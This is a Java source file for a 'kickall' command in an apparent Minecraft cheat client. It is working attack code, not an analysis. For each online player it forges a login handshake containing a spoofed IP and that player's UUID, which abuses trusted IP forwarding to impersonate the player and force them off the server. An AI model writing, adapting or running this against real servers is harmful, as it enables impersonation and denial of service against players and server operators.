package it.nobusware.client.commands;

import it.nobusware.client.manager.Command;
import it.nobusware.client.utils.ChatUtils;
import net.minecraft.client.Minecraft;
import net.minecraft.client.gui.GuiIngameMenu;
import net.minecraft.client.multiplayer.GuiConnecting;
import net.minecraft.client.network.NetHandlerLoginClient;
import net.minecraft.client.network.NetworkPlayerInfo;
import net.minecraft.network.EnumConnectionState;
import net.minecraft.network.NetworkManager;
import net.minecraft.network.handshake.client.C00Handshake;
import net.minecraft.network.login.client.C00PacketLoginStart;

import java.net.InetAddress;
import java.util.Collection;
import java.util.Random;

public class KickAll extends Command{

    @Override
    public String getAlias() {
        return "kickall";
    }

    @Override
    public String getDescription() {
        return "Kick all the people";
    }

    @Override
    public String getSyntax() {
        return ".kickall <Ip> <Port>";
    }

    @Override
    public void onCommand(String comando, String[] args) {
        new Thread(() -> {
            try {
                int port = Integer.parseInt(args[1]);
                Collection<NetworkPlayerInfo> playersC = Minecraft.getMinecraft().getNetHandler().getPlayerInfoMap();
                for (NetworkPlayerInfo nt : playersC) {
                    if (nt.func_178845_a().getId().toString().equals(Minecraft.getMinecraft().thePlayer.getUniqueID().toString())) continue;
                    Random rand = new Random();
                    InetAddress address;
                    address = InetAddress.getByName(args[0]);
                    GuiConnecting.networkManager = NetworkManager.provideLanClient(address, port);
                    GuiConnecting.networkManager.setNetHandler(new NetHandlerLoginClient(GuiConnecting.networkManager, Minecraft.getMinecraft(), new GuiIngameMenu()));
                    GuiConnecting.networkManager.sendPacket(new C00Handshake(210, args[0] + "\u0000" + "32.123." + rand.nextInt(255) + "." + rand.nextInt(255) + "\u0000" + nt.func_178845_a().getId().toString(), port, EnumConnectionState.LOGIN));
                    GuiConnecting.networkManager.sendPacket(new C00PacketLoginStart(nt.func_178845_a()));
                    Thread.sleep(0L);
                }
                ChatUtils.print("All the people were kicked!");
            } catch (Exception ex) {
                ChatUtils.print("§cCould not kick!");
            }
        }).start();
    }
}